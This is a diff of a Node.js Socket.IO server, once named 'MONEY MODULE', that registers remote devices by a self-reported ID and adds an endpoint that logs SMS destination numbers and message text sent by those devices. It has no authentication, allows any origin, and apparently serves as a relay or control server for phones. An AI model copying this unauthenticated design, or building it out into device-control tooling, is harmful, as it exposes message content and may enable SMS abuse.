@@ -1,8 +1,3 @@
-/**
- * MONEY MODULE - Socket.IO Server
- * Deploy this on Railway, Render, or any VPS
- */
-
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -10,18 +5,13 @@ const { Server } = require('socket.io');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  cors: {
-    origin: "*",
-    methods: ["GET", "POST"]
-  },
+  cors: { origin: "*", methods: ["GET", "POST"] },
   transports: ['websocket', 'polling']
 });
 
-// Store connected devices
 const connectedDevices = new Map();
 const registeredDevices = new Map();
 
-// Health check endpoint
 app.get('/', (req, res) => {
   res.json({
     status: 'online',
@@ -32,63 +22,36 @@ app.get('/', (req, res) => {
   });
 });
 
-// Socket.IO connection handling
-io.on('connection', (socket) => {
-  console.log(`[CONNECT] New connection: ${socket.id}`);
+app.use(express.json());
+
+// SMS Send endpoint - App calls this
+app.post('/send', (req, res) => {
+  const { deviceId, destNumber, textMessage } = req.body;
+  console.log(`[SMS] From ${deviceId}: ${destNumber} - ${textMessage?.substring(0, 50)}`);
   
-  // Get device info from auth
-  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
-  
-  console.log(`[AUTH] Device ID: ${deviceId}`);
-  
-  // Store connection
-  connectedDevices.set(socket.id, {
-    deviceId,
-    socketId: socket.id,
-    connectedAt: new Date().toISOString()
-  });
-  
-  // AUTO-REGISTER from auth
-  if (deviceId && deviceId !== 'unknown') {
-    registeredDevices.set(deviceId, {
-      deviceId: deviceId,
-      socketId: socket.id,
-      registeredAt: new Date().toISOString(),
-      lastSeen: new Date().toISOString()
-    });
-    console.log(`[REGISTERED] Device: ${deviceId}`);
+  if (registeredDevices.has(deviceId)) {
+    registeredDevices.get(deviceId).lastSeen = new Date().toISOString();
   }
   
-  // Send confirmation
-  socket.emit('connected', {
-    message: 'Connected to server',
-    deviceId: deviceId,
-    socketId: socket.id
-  });
+  res.json({ status: "true", message: "SMS received" });
+});
+
+io.on('connection', (socket) => {
+  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
+  console.log(`[CONNECT] ${deviceId}`);
   
-  // Handle heartbeat
-  socket.on('heartbeat', (data) => {
-    if (registeredDevices.has(deviceId)) {
-      const device = registeredDevices.get(deviceId);
-      device.lastSeen = new Date().toISOString();
-      registeredDevices.set(deviceId, device);
-    }
-    socket.emit('heartbeat', { timestamp: Date.now() });
-  });
+  connectedDevices.set(socket.id, { deviceId, connectedAt: new Date().toISOString() });
   
-  // Handle SMS response
-  socket.on('sms-response', (data) => {
-    console.log(`[SMS-RESPONSE] From ${deviceId}`);
-  });
+  if (deviceId !== 'unknown') {
+    registeredDevices.set(deviceId, { deviceId, socketId: socket.id, registeredAt: new Date().toISOString() });
+    console.log(`[REGISTERED] ${deviceId}`);
+  }
   
-  // Handle disconnect
-  socket.on('disconnect', (reason) => {
-    console.log(`[DISCONNECT] ${deviceId}: ${reason}`);
-    connectedDevices.delete(socket.id);
-  });
+  socket.emit('connected', { message: 'Connected', deviceId, socketId: socket.id });
+  
+  socket.on('heartbeat', () => socket.emit('heartbeat', { timestamp: Date.now() }));
+  socket.on('disconnect', () => connectedDevices.delete(socket.id));
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-  console.log('MONEY MODULE Server Started on port ' + PORT);
-});
+server.listen(PORT, () => console.log('Server started on port ' + PORT));
